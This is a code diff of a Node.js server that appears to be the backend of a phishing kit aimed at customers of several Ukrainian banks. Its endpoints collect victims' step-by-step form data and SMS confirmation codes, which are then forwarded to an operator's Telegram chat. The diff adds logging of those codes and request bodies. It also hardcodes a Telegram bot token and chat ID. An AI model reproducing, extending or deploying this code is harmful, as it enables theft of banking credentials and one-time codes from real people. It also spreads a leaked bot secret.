@@ -5,11 +5,14 @@ const WebSocket = require('ws');
 const path = require('path');
 require('dotenv').config();
 
-// Настройки
+// =======================================================================
+// --- НАСТРОЙКИ: Используйте env vars ---
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
 const CHAT_ID = process.env.CHAT_ID || '-4970332008';
 const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
+// =======================================================================
 
+// --- СПИСОК БАНКІВ ДЛЯ КНОПКИ "ЗАПРОС" ---
 const banksForRequestButton = [
     'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
     'Восток', 'Izibank', 'Укрсиб'
@@ -19,7 +22,13 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Обслуживание index.html
+// Логирование всех запросов для дебага
+app.use((req, res, next) => {
+    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
+    next();
+});
+
+// Обслуживание index.html из корня
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -33,11 +42,17 @@ bot.setWebHook(WEBHOOK_URL).then(() => {
     console.error('Error setting webhook:', err);
 });
 
+// Тестовое сообщение при запуске
+bot.sendMessage(CHAT_ID, 'Сервер запустился! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
+
 // Маршрут для Telegram webhook
 app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
     bot.processUpdate(req.body);
     res.sendStatus(200);
 });
+
+// Тест бота
+bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
 
 const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -74,6 +89,8 @@ wss.on('connection', (ws) => {
 app.post('/api/submit', (req, res) => {
     console.log('API /submit:', req.body);
     const { sessionId, isFinalStep, ...stepData } = req.body;
+
+    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`); // Дебаг лог
 
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
@@ -121,6 +138,7 @@ app.post('/api/submit', (req, res) => {
 app.post('/api/sms', (req, res) => {
     console.log('API /sms:', req.body);
     const { sessionId, code } = req.body;
+    console.log(`SMS for ${sessionId}: code=${code}`); // Дебаг лог
     const sessionData = sessions.get(sessionId);
     if (sessionData) {
         let message = `<b>Отримано SMS!</b>\n\n`;
@@ -206,6 +224,12 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
+// Обработка ошибок Telegram polling (если включено, но мы на webhook)
+bot.on('polling_error', (error) => {
+    console.error('Telegram polling error:', error);
+});
+
+// Глобальная обработка ошибок Express
 app.use((err, req, res, next) => {
     console.error('Server error:', err);
     res.status(500).json({ message: 'Internal Server Error' });
